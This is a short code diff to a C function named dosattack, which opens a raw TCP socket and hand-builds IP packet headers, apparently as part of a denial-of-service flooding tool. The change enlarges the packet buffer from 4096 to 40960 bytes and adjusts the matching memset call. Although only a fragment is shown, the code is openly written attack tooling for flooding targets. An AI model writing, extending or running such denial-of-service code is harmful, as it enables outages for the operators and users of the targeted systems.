@@ -65,7 +65,7 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     //Create a raw socke
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     //Datagram to represent the packet
-    char datagram[4096];
+    char datagram[40960];
     char source_ip[32];
     //IP header
     struct iphdr *iph = (struct iphdr *)datagram;
@@ -83,7 +83,8 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     //sin.sin_addr.s_addr = inet_addr("1.2.3.4");
 
     // Zero out the buffer
-    memset(datagram, 0, 4096);
+    //memset(datagram, 0, 4096);
+    memset(datagram, 0, 40960);
 
     // Fill in the IP Header
     iph->ihl = 5;
